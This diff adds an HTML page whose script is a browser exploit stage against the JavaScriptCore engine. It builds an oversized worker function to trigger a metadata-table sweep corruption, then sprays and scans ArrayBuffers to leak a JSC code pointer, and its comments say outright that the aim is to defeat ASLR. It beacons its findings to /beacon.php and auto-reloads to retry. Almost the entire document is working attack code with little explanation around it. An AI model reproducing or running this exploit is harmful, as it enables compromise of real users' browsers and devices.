@@ -1,0 +1,207 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1163 - Sweep Code-Pointer Harvest</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8c8d0;font:12px/1.5 'Courier New',monospace;padding:10px}
+h2{color:#00ff88;font-size:14px;margin:6px 0}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:75vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.err{color:#ff4466}.info{color:#44aaff}.warn{color:#ffaa00}
+.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head><body>
+<h2>P1163 MetadataTable Sweep — Code-Pointer Harvest</h2>
+<div id="log"></div>
+<script>
+'use strict';
+var L=document.getElementById('log'),T0=Date.now();
+function log(m,c){var d=document.createElement('div');d.className=c||'';
+d.textContent='['+(((Date.now()-T0)/1000).toFixed(1))+'s] '+m;L.appendChild(d);L.scrollTop=1e6;}
+function B(tag,data){try{var u='/beacon.php?tag=P1163-'+encodeURIComponent(tag);
+if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+
+/* ═══════════════════════════════════════════════════════════════════════
+   P1163: harvest the JSC code pointer the sweep WRITES.
+
+   Entry layout (JIT-off, 112B stride — docs/bugs/entry-layout.md):
+     +12: m_slowPathCount = 0xFFFFFFFF   (signature)
+     +24: m_slowPathCallDestination = getCTILinkCall().code()
+          -> JSC CODE POINTER, same in EVERY entry (ASLR defeat)
+     +68: m_bytecodeIndex = sequential counter
+   Optimal wrap: N=38,348,816 -> N*112 = 2^32 + 100,096 -> ~100KB buffer.
+
+   Architecture (community p146): worker sweeps (crashes at unmapped),
+   main thread ALLOCATES 100KB ArrayBuffers DURING the sweep (they land
+   at the heap frontier = in the sweep path) and scans them for the
+   nonzero pattern -> beacons the code pointer BEFORE the crash.
+   ═══════════════════════════════════════════════════════════════════════ */
+
+var attempt=0;
+try{attempt=parseInt(localStorage.getItem('p1163_att')||'0');}catch(e){}
+try{localStorage.setItem('p1163_att',''+(attempt+1));}catch(e){}
+B('BOOT','attempt='+attempt);
+
+if(attempt>=2){
+  B('IDLE','2 attempts done');
+  log('=== IDLE ===','ok');
+  try{localStorage.removeItem('p1163_att');}catch(e){}
+}else{
+
+var N_TARGET=38348816;
+var CHUNK=4000000;
+var CHUNKS=Math.floor(N_TARGET/CHUNK);
+var REM=N_TARGET-CHUNKS*CHUNK;
+var abs=[];         /* 100KB buffers allocated during sweep */
+var scanned=0;
+var finds=[];
+var goSent=false;
+var polling=false;
+
+function buildBlob(){
+  var t0=Date.now();
+  var parts=[];
+  parts.push('self.__v141fn=function(a){');
+  for(var c=0;c<CHUNKS;c++){
+    parts.push('a();'.repeat(CHUNK));
+    if(c%4===0)B('BLD','c='+c+'|ms='+(Date.now()-t0));
+  }
+  if(REM>0)parts.push('a();'.repeat(REM));
+  parts.push('};self.postMessage({t:"compiled"});');
+  var blob=new Blob(parts,{type:'application/javascript'});
+  parts=null;
+  B('BLOB','ms='+(Date.now()-t0));
+  return URL.createObjectURL(blob);
+}
+
+/* scan one 100KB AB for the sweep pattern (alignment-agnostic) */
+function scanAb(ab){
+  var dv=new DataView(ab);
+  var hits=[];
+  /* the sweep's 112B entries enter our AB at an unknown offset.
+     Signature = uint32 0xFFFFFFFF at entry+12; code pointer at entry+24
+     = signature_offset + 12. Scan every uint32 position. */
+  var len=ab.byteLength;
+  var prevWasFF=false;
+  for(var p=0;p+28<len;p+=4){
+    var v=dv.getUint32(p,true);
+    if(v===0xFFFFFFFF){
+      /* candidate signature: read the 8-byte code pointer at p+12 */
+      var cpLo=dv.getUint32(p+12,true);
+      var cpHi=dv.getUint32(p+16,true);
+      var idx=dv.getUint32(p+56,true);
+      hits.push('p='+p+'|cp='+cpHi.toString(16).padStart(8,'0')+cpLo.toString(16).padStart(8,'0')+'|idx='+idx);
+      p+=108; /* skip rest of this entry */
+    }
+    prevWasFF=(v===0xFFFFFFFF);
+  }
+  if(hits.length>0){
+    B('AB-HIT','n='+hits.length+'|'+hits.slice(0,3).join(';'));
+    log('*** AB-HIT: '+hits.slice(0,3).join(' ; ')+' ***','hit');
+    finds.push(hits);
+    return hits.length;
+  }
+  /* fallback: any nonzero qword at all = sweep passed through */
+  var nz=0,first='';
+  for(var q=0;q+7<len;q+=8){
+    var lo=dv.getUint32(q,true),hi=dv.getUint32(q+4,true);
+    if(lo!==0||hi!==0){nz++;if(!first)first='q'+q+'='+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');}
+  }
+  if(nz>0){
+    B('AB-NZ','nz='+nz+'|'+first);
+    log('AB-NZ: '+nz+' nonzero, first '+first,'warn');
+    finds.push(['nz:'+nz+':'+first]);
+    return nz;
+  }
+  return 0;
+}
+
+/* poll loop: scan newest abs, beacon first find */
+var lastPollB=0;
+function poll(){
+  if(!polling)return;
+  for(var i=scanned;i<abs.length;i++){
+    var r=scanAb(abs[i]);
+    scanned=i+1;
+    if(r>0){polling=false;return;}
+  }
+  if(Date.now()-lastPollB>500){
+    lastPollB=Date.now();
+    B('POLL','abs='+abs.length+'|scanned='+scanned+'|clean');
+  }
+  setTimeout(poll,100);
+}
+
+/* allocate 100KB ABs during the sweep */
+function allocLoop(){
+  var batches=0;
+  var iv=setInterval(function(){
+    if(batches>=24){clearInterval(iv);B('ALLOC-DONE','abs='+abs.length);return;}
+    batches++;
+    for(var k=0;k<10;k++){
+      var ab=new ArrayBuffer(100*1024);
+      abs.push(ab);
+    }
+  },50);
+}
+
+/* worker */
+var blobUrl=buildBlob();
+var wcode='importScripts('+JSON.stringify(blobUrl)+');'+
+  'self.onmessage=function(m){if(m.data==="go"){'+
+  'try{self.__v141fn(function(){ });}'+
+  'catch(e){self.postMessage({t:"err",e:String(e)});}}};';
+var wUrl=URL.createObjectURL(new Blob([wcode],{type:'application/javascript'}));
+var worker=new Worker(wUrl);
+worker.__compiled=false;
+worker.onmessage=function(m){
+  if(m.data&&m.data.t==='compiled'){worker.__compiled=true;B('WORKER-COMPILED','ok');}
+  else if(m.data&&m.data.t==='err'){B('WORKER-ERR',String(m.data.e).slice(0,60));}
+};
+B('WORKER','created');
+
+var chk=setInterval(function(){
+  if(worker.__compiled&&!goSent){
+    goSent=true;
+    B('GO','sweep start');
+    log('=== GO: allocating 100KB ABs during worker sweep ===','warn');
+    polling=true;
+    poll();
+    allocLoop();
+    worker.postMessage('go');
+    setTimeout(function(){
+      B('SURVIVED','abs='+abs.length+'|finds='+finds.length);
+      B('DONE','survived');
+      polling=false;
+    },15000);
+    clearInterval(chk);
+  }
+},500);
+
+setTimeout(function(){
+  if(!goSent){B('TIMEOUT','compile never reported');B('DONE','timeout');}
+},60000);
+
+} /* attempts */
+
+/* auto-reload checker */
+(function(){
+  var cur='P1163-codeptr-harvest';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body></html>
